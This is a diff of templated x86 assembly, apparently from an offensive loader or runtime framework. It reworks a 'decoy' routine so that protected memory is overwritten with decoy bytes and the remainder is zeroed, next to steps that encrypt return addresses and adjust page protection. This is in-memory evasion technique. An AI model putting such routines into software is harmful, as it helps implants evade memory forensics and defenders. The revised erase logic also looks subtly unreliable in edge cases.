@@ -22,7 +22,8 @@
 //   encrypt return address                                erase return address
 //   encrypt critical instructions to shelter              adjust the critical memory page protect
 //   adjust the critical memory page protect               fill critical memory with decoy
-//   fill critical memory with decoy                       free critical memory page
+//   fill critical memory with decoy                       fill remaining critical memory
+//   fill remaining critical memory                        free critical memory page
 //   encrypt stack about structure                         exit current thread
 //   call WaitForSingleObject
 //   decrypt stack about structure
@@ -252,26 +253,14 @@ protect:
   ret 4                                        {{iji}} // return and release stack
 
 decoy:
-  // erase critical memory
-  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // set critical address
-  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 5*4]     {{iji}} // set critical size
-  shr {{.RegV.edx}}, 2                         {{iji}} // calculate the loop count
-  xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // calculate zero value
- loop_erase:
-  mov [{{.RegV.ecx}}], {{.RegV.eax}}           {{iji}} // erase data
-  add {{.RegV.ecx}}, 4                         {{iji}} // add critical address
-  dec {{.RegV.edx}}                            {{iji}} // update loop count
-  jnz loop_erase                               {{iji}} // check need erase next
-
-  // fill critical memory with decoy
+  // fill critical memory with decoy first
+  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // get critical address
   mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 6*4]     {{iji}} // get decoy address
   test {{.RegV.ecx}}, {{.RegV.ecx}}            {{iji}} // check decoy address is zero
-  jz skip_decoy                                {{iji}} // check need skip fill
-  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 7*4]     {{iji}} // set decoy size (loop count)
+  jz erase_remaining                           {{iji}} // skip fill, go erase
+  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 7*4]     {{iji}} // get decoy size
   test {{.RegV.edx}}, {{.RegV.edx}}            {{iji}} // check decoy size is zero
-  jz skip_decoy                                {{iji}} // check need skip fill
-  mov {{.RegV.eax}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // set critical address
-
+  jz erase_remaining                           {{iji}} // skip fill, go erase
   push ebx                                     {{iji}} // save register
  loop_decoy:
   mov bl, [{{.RegV.ecx}}]                      {{iji}} // load one byte from decoy
@@ -281,6 +270,21 @@ decoy:
   dec {{.RegV.edx}}                            {{iji}} // update loop count
   jnz loop_decoy                               {{iji}} // check need fill next
   pop ebx                                      {{iji}} // restore register
+
+  // erase the remaining part of critical memory
+ erase_remaining:
+  mov {{.RegV.ecx}}, [{{.RegN.ebp}} + 4*4]     {{iji}} // get critical address
+  add {{.RegV.ecx}}, [{{.RegN.ebp}} + 7*4]     {{iji}} // advance past decoy (decoy size)
+  mov {{.RegV.edx}}, [{{.RegN.ebp}} + 5*4]     {{iji}} // get critical size
+  sub {{.RegV.edx}}, [{{.RegN.ebp}} + 7*4]     {{iji}} // remaining = critical size - decoy size
+  jz skip_decoy                                {{iji}} // no remaining bytes to erase
+  shr {{.RegV.edx}}, 2                         {{iji}} // calculate the loop count (dwords)
+  xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // zero value
+ loop_erase:
+  mov [{{.RegV.ecx}}], {{.RegV.eax}}           {{iji}} // erase critical data
+  add {{.RegV.ecx}}, 4                         {{iji}} // update address
+  dec {{.RegV.edx}}                            {{iji}} // update loop count
+  jnz loop_erase                               {{iji}} // check need erase next
 
  skip_decoy:
   ret                                          {{iji}}
